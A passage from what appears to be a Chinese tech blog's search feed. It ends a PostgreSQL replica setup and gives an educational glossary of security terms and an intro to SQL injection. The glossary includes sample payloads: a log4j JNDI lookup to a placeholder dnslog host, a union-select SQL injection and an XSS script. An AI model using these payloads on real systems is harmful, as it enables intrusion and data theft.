<li>修改postgresql.auto.conf文件<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 注意ip地址</span><br><span class="line">primary_conninfo = &#x27;user=postgres password=postgres host=192.168.11.66 port=5432 sslmode=prefer sslcompression=0 gssencmode=prefer krbsrvname=postgres target_session_attrs=any&#x27;</span><br><span class="line">restore_command = &#x27;cp /archive/%f %p&#x27;</span><br></pre></td></tr></table></figure></li>
<li>启动新的从节点<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pg_ctl start -D ~/12/data/</span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <tags>
        <tag>PostgreSQL</tag>
      </tags>
  </entry>
  <entry>
    <title>网络安全常用术语</title>
    <url>/2025/02/06/20250206-01.html</url>
    <content><![CDATA[<h1 id="黑客（hacker）"><a href="#黑客（hacker）" class="headerlink" title="黑客（hacker）"></a>黑客（hacker）</h1><ul>
<li>对计算机技术非常擅长的人，窃取数据、破坏计算机系统</li>
<li>匿名的（Anonymous）</li>
</ul>
<h1 id="脚本小子"><a href="#脚本小子" class="headerlink" title="脚本小子"></a>脚本小子</h1><p>刚刚入门安全行业，学习了一些技术，只会只用现成的工具或者从网上复制代码</p>
<h1 id="白帽子"><a href="#白帽子" class="headerlink" title="白帽子"></a>白帽子</h1><ul>
<li>白帽子的目的是发现企业的漏洞并且上报给企业，帮助其解决风险问题；</li>
<li>360补天、漏洞盒子、CNVD、CNNVD</li>
</ul>
<h1 id="红帽黑客"><a href="#红帽黑客" class="headerlink" title="红帽黑客"></a>红帽黑客</h1><ul>
<li>有正义感、爱国的黑客；</li>
<li>利用技术维护国家网络 安全，并且对外来的攻击进行反击。</li>
</ul>
<h1 id="漏洞（Vulnerability）"><a href="#漏洞（Vulnerability）" class="headerlink" title="漏洞（Vulnerability）"></a>漏洞（Vulnerability）</h1><ul>
<li>漏洞指的是硬件、软件、协议等等存在的安全缺陷；</li>
<li><a href="http://www.cnnvd.org.cn/web/wz/bzxqById.tag?id=3&mkid=3">http://www.cnnvd.org.cn/web/wz/bzxqById.tag?id=3&amp;mkid=3</a></li>
</ul>
<h1 id="POC（Proof-of-Concept）"><a href="#POC（Proof-of-Concept）" class="headerlink" title="POC（Proof of Concept）"></a>POC（Proof of Concept）</h1><ul>
<li>能证明漏洞存在的代码；</li>
<li>例:${jndi:ldap:&#x2F;&#x2F;xxxxxx.dnslog.cn&#x2F;test}。</li>
</ul>
<h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><ul>
<li>Exploit（利用）；</li>
<li>执行了这一段利用代码之后，就能够达到攻击的目的；</li>
<li>msf。</li>
</ul>
<h1 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h1><ul>
<li>攻击载荷；</li>
<li>SQL注入：<a href="http://localhost/sqli-labs/Less-3/?id=-1">http://localhost/sqli-labs/Less-3/?id=-1</a>‘) union select 1,2,database() –+</li>
<li>XSS：<script>alert(1)</script></li>
<li>log4j：${jndi:ldap:&#x2F;&#x2F;xxxxxx.domain.cn&#x2F;test}</li>
</ul>
<h1 id="0day漏洞"><a href="#0day漏洞" class="headerlink" title="0day漏洞"></a>0day漏洞</h1><p>使用量非常大的通用产品漏洞已经被发现了（还没有公开），官方还没有发布补丁或者修复方法的漏洞</p>
<h1 id="1day漏洞"><a href="#1day漏洞" class="headerlink" title="1day漏洞"></a>1day漏洞</h1><p>POC和EXP已经被公开了，但是很多人还来不及修复的漏洞</p>
<h1 id="Nday漏洞"><a href="#Nday漏洞" class="headerlink" title="Nday漏洞"></a>Nday漏洞</h1><h1 id="漏洞扫描（漏扫）"><a href="#漏洞扫描（漏扫）" class="headerlink" title="漏洞扫描（漏扫）"></a>漏洞扫描（漏扫）</h1><p>基于数据库对漏洞进行自动化扫描</p>
<h1 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h1><ul>
<li>patch</li>
<li>漏洞的修复程序</li>
</ul>
<h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><ul>
<li>penetration</li>
<li>黑客入侵网站或者计算机系统获取到控制计算机权限的过程</li>
</ul>
<h1 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h1><ul>
<li>penetration test</li>
<li>用黑客入侵的方式对系统进行安全测试，目的是找出和修复安全漏洞</li>
<li>这个过程中不会影响系统的正常运行，也不会破坏数据</li>
</ul>
<h1 id="木马"><a href="#木马" class="headerlink" title="木马"></a>木马</h1><ul>
<li>Trojan horse</li>
<li>隐藏在计算机中的恶意程序</li>
</ul>
<h1 id="病毒"><a href="#病毒" class="headerlink" title="病毒"></a>病毒</h1><ul>
<li>Virus</li>
<li>恶意代码或程序</li>
</ul>
<h1 id="杀毒软件"><a href="#杀毒软件" class="headerlink" title="杀毒软件"></a>杀毒软件</h1><ul>
<li>360</li>
<li>瑞星</li>
<li>江民</li>
<li>金山</li>
<li>诺顿</li>
<li>卡巴斯基</li>
<li>McAfee</li>
</ul>
<h1 id="免杀"><a href="#免杀" class="headerlink" title="免杀"></a>免杀</h1><p>绕过杀毒软件</p>
<h1 id="肉鸡"><a href="#肉鸡" class="headerlink" title="肉鸡"></a>肉鸡</h1><ul>
<li>已经被黑客获得控制权限的机器，可能是个人电脑也可能是企业或者政府单位的服务器</li>
<li>通常情况下因为使用者并不知道已经被入侵，所以黑客可以长期获得权限和控制。</li>
</ul>
<h1 id="抓鸡"><a href="#抓鸡" class="headerlink" title="抓鸡"></a>抓鸡</h1><p>利用出现概率非常高漏洞(比如log4j、永恒之蓝)，使用自动化方式获取肉鸡的行为</p>
<h1 id="跳板机"><a href="#跳板机" class="headerlink" title="跳板机"></a>跳板机</h1><p>黑客为了防止被追溯和识别身份，一般都不会用自己的电脑发起攻击，而是利用获取的肉鸡来攻击其他目标，这个肉鸡就充当一个跳板的角色</p>
<h1 id="DDos"><a href="#DDos" class="headerlink" title="DDos"></a>DDos</h1><ul>
<li>Distributed Denial of Service</li>
<li>分布式拒绝服务攻击</li>
<li>发起大量恶意请求，导致正常用户无法访问</li>
</ul>
<h1 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h1><ul>
<li>backdoor</li>
<li>黑客为了对主机进行长期的控制，在机器上种植的一段程序或留下的一个“入口”</li>
</ul>
<h1 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a>中间人攻击</h1><ul>
<li>Man-in-the-Middle Attack</li>
<li>MITM攻击</li>
<li>运行中间服务器，拦截并篡改数据</li>
</ul>
<h1 id="网络钓鱼"><a href="#网络钓鱼" class="headerlink" title="网络钓鱼"></a>网络钓鱼</h1><p>钓鱼网站指的是冒充的网站，用来窃取用户的账号密码</p>
<h1 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h1><ul>
<li>shell是一种命令执行工具，可以对计算机进行控制</li>
<li>webshell就是asp、php、jsp之外的web代码文件，通过这些代码文件可以执行任意的命令，对计算机做任意的操作</li>
</ul>
<p>分类：</p>
<ul>
<li>小马</li>
<li>一句话木马：godzilla、behinder、ant sword</li>
<li>大马</li>
</ul>
<h1 id="GetShell"><a href="#GetShell" class="headerlink" title="GetShell"></a>GetShell</h1><p>获得命令执行环境的操作</p>
<p>例如：</p>
<ul>
<li>Redis的持久化功能</li>
<li>MySQL的写文件功能</li>
<li>MySQL的日志记录功能</li>
<li>上传功能</li>
<li>数据备份功能</li>
<li>编辑器</li>
</ul>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><ul>
<li>Privilege Escalation</li>
<li>权限提升</li>
<li>利用普通用户把自己提升为管理员的操作</li>
</ul>
<h1 id="拿站"><a href="#拿站" class="headerlink" title="拿站"></a>拿站</h1><p>指得到一个网站的最高权限，即得到后台和管理员名字和密码</p>
<h1 id="脱（拖）裤"><a href="#脱（拖）裤" class="headerlink" title="脱（拖）裤"></a>脱（拖）裤</h1><p>拖库指的是网站被入侵以后，黑客把全部的数据都导出，窃取到了数据文件</p>
<h1 id="装库"><a href="#装库" class="headerlink" title="装库"></a>装库</h1><p>用获得的裤子去批量登录其他的网站</p>
<h1 id="旁站入侵"><a href="#旁站入侵" class="headerlink" title="旁站入侵"></a>旁站入侵</h1><p>入侵同服务器的其他网站</p>
<h1 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h1><p>攻击者入侵一台服务器成功以后，基于内部网络，继续入侵同网段的其他机器</p>
<h1 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h1><ul>
<li>Proxy</li>
<li>帮助发起网络请求的一台服务器</li>
</ul>
<h1 id="VPN"><a href="#VPN" class="headerlink" title="VPN"></a>VPN</h1><ul>
<li>Virtual Private Network</li>
<li>代理</li>
<li>加密通信</li>
<li>远程办公（从家里连接到公司内网）</li>
</ul>
<h1 id="蜜罐"><a href="#蜜罐" class="headerlink" title="蜜罐"></a>蜜罐</h1><ul>
<li>HoneyPot</li>
<li>吸引攻击者攻击的伪装系统，用来实现溯源和反制</li>
</ul>
<h1 id="沙箱"><a href="#沙箱" class="headerlink" title="沙箱"></a>沙箱</h1><ul>
<li>Sandbox</li>
<li>沙箱是一种按照安全策略限制程序行为的执行环境，就算有恶意代码，也只能影响沙箱环境而不会影响到操作系统。</li>
</ul>
<h1 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h1><p>模拟的有漏洞的环境<br>可以是网站、容器、操作系统</p>
<p>类型：</p>
<p>web综合靶场：DVWA、pikachu、bwapp<br>web专用靶场：sqli-labs、upload-labs、xss-labs<br>漏洞复现靶场：CVE-44228<br>操作系统靶场：vulnhub<br>CTF靶场：专门用来练习CTF题目，每个人都有一个独立的环境</p>
<h1 id="堡垒机"><a href="#堡垒机" class="headerlink" title="堡垒机"></a>堡垒机</h1><p>jumpserver跳板机<br>运维审计系统：管理资源，审批，审计，访问控制，事件记录</p>
<p>WAF</p>
<p>Web Application Firewall<br>Web应用防火墙<br>对HTTP&#x2F;HTTPS的流量内容进行分析，拦截恶意攻击行为</p>
<h1 id="APT"><a href="#APT" class="headerlink" title="APT"></a>APT</h1><p>Advanced Persistent Threat<br>高级可持续威胁攻击<br>指有组织在网络上对特定对象展开的持续有效的攻击活动<br>报告：2021深信服APT攻防趋势半年洞察</p>
<h1 id="护网（HVV）"><a href="#护网（HVV）" class="headerlink" title="护网（HVV）"></a>护网（HVV）</h1><p>国家组织牵头组织事业单位，国企单位，名企单位等开展攻防两方的网络安全演习</p>
<h1 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h1><p>Capture The Flag夺旗赛：起源于1996年DEFCON全球黑客大会；解出题目，获得flag，就可以得分</p>
<p>是一种黑客技术竞赛：</p>
<p>解题形式：Jeopardy<br>攻防形式：Attack-Defense</p>
<p>方向：</p>
<p>Reverse<br>Pwn<br>Web<br>Crypto<br>Misc<br>Mobile</p>
<p>常用在线CTF：</p>
<p>bugku：<a href="https://ctf.bugku.com/challenges/index.html">https://ctf.bugku.com/challenges/index.html</a><br>北京联合大学：<a href="https://ctf.bugku.com/challenges">https://ctf.bugku.com/challenges</a><br>CTFHub：<a href="https://www.ctfhub.com/">https://www.ctfhub.com/</a><br>bmzCTF：<a href="http://bmzclub.cn/challenges">http://bmzclub.cn/challenges</a><br>攻防世界：<a href="https://adworld.xctf.org.cn/">https://adworld.xctf.org.cn</a><br>CTFSHOW：<a href="https://ctf.show/challenges">https://ctf.show/challenges</a></p>
<h1 id="CVE"><a href="#CVE" class="headerlink" title="CVE"></a>CVE</h1><p>Common Vulnerabilities and Exposures<br>通用漏洞披露</p>
<p>Mitre</p>
<p>例如：CVE-2021-44228</p>
<p><a href="https://www.cve.org/">https://www.cve.org/</a></p>
<h1 id="CNVD"><a href="#CNVD" class="headerlink" title="CNVD"></a>CNVD</h1><p>国家信息安全漏洞共享平台：<a href="https://www.cnvd.org.cn/">https://www.cnvd.org.cn/</a><br>国家计算机应急响应中心（CNCERT维护）：<a href="https://www.cert.orgh.ctmn/lpublish/main/index.html">https://www.cert.orgh.ctmn/lpublish/main/index.html</a></p>
<h1 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a>应急响应</h1><p>一个公司为了应对各种安全事件所做的准备和事后采取的措施</p>
<h1 id="SRC"><a href="#SRC" class="headerlink" title="SRC"></a>SRC</h1><p>Security Response Center：企业的应急响应中心<br><a href="http://0xsafe.org/">http://0xsafe.org/</a></p>
<h1 id="公益SRC"><a href="#公益SRC" class="headerlink" title="公益SRC"></a>公益SRC</h1><p><a href="https://www.vulbox.com/">https://www.vulbox.com/</a><br><a href="https://src.sjtu.edu.cn/">https://src.sjtu.edu.cn/</a></p>
<h1 id="网络空间测绘"><a href="#网络空间测绘" class="headerlink" title="网络空间测绘"></a>网络空间测绘</h1><p>网络空间资源收录</p>
<p>网络空间搜索引擎：</p>
<p><a href="http://www.shodan.io/">www.shodan.io</a><br>fofa.so<br><a href="http://www.zoomeye.org/">www.zoomeye.org</a></p>
<h1 id="ATT-CK"><a href="#ATT-CK" class="headerlink" title="ATT&amp;CK"></a>ATT&amp;CK</h1><p>Adversarial Tactics, Techniques, and Common Knowledge<br>对抗战术、技术和通用知识（攻击者技战术的知识库）</p>
<p>Mitre</p>
<p>风险分析模型：收集威胁情报，模拟APT攻击</p>
<h1 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h1><p>Reverse</p>
<p>把程序还原为源代码，分析程序的运行过程</p>
<h1 id="DevOps"><a href="#DevOps" class="headerlink" title="DevOps"></a>DevOps</h1><p>Development+Operations<br>开发测试运维一体化</p>
<h1 id="CICD"><a href="#CICD" class="headerlink" title="CICD"></a>CICD</h1><p>包括：</p>
<p>持续集成（Continuous Integration）<br>持续交付（Continuous Delivery）<br>持续部署（Continuous Deployment）</p>
<p>具体技术：</p>
<p>Git代码管理<br>Jenkins版本管理<br>代码扫描<br>自动化测试</p>
<h1 id="DevSecOps"><a href="#DevSecOps" class="headerlink" title="DevSecOps"></a>DevSecOps</h1><p>Development+Security+Operations<br>安全开发与运维</p>
<h1 id="等保"><a href="#等保" class="headerlink" title="等保"></a>等保</h1><p>网络安全等级保护</p>
<p>要求相关行业的单位和公司的信息系统必须进行定级，然后在公安机关备案，然后建设整改，然后由测评机构评级，并且持续维护和监督。</p>
]]></content>
      <tags>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入概述</title>
    <url>/2025/02/27/20250227-01.html</url>
    <content><![CDATA[<p><img src="/./assets/20250227/b58a5acb4b804371b13c63ec0e7d4ffd.png" alt="SQL注入"></p>
<p>SQL注入即是指<a href="https://baike.baidu.com/item/web%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/2498090">web应用程序</a>对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的<a href="https://baike.baidu.com/item/SQL%E8%AF%AD%E5%8F%A5/5714895">SQL语句</a>，在管理员不知情的情况下实现非法操作，以此来实现欺骗<a href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9C%8D%E5%8A%A1%E5%99%A8/613818">数据库服务器</a>执行非授权的任意查询，从而进一步得到相应的数据信息。</p>
<h3 id="Web应用程序三层架构"><a href="#Web应用程序三层架构" class="headerlink" title="Web应用程序三层架构"></a>Web应用程序三层架构</h3><ul>
<li>视图层</li>
<li>业务逻辑层</li>
<li>数据访问层</li>
</ul>
<p><img src="/./assets/20250227/9bc82122e3c340ba8812f830472a538f.png" alt="Web三层架构"></p>
]]></content>
      <tags>
        <tag>SQL</tag>
      </tags>
  </entry>
</search>
